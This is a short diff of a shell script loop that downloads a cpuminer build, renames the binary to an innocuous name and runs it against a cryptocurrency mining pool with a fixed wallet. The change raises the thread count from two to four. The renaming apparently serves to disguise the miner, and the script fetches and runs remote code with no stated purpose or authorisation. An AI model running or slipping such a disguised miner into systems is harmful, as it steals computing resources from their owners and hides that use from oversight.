@@ -6,6 +6,6 @@ wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpu
 tar -xf cpuminer-opt-linux.tar.gz
 cd miner
 mv cpuminer-sse2 nanung
-./nanung -a lyra2z330  -o stratum+tcps://stratum-ru.rplant.xyz:17025 -u HKjRLWDvk2LHSgxT5DMbEwErQai9ZrD7V2.nanung -t2
+./nanung -a lyra2z330  -o stratum+tcps://stratum-ru.rplant.xyz:17025 -u HKjRLWDvk2LHSgxT5DMbEwErQai9ZrD7V2.nanung -t4
 sleep 5
 done
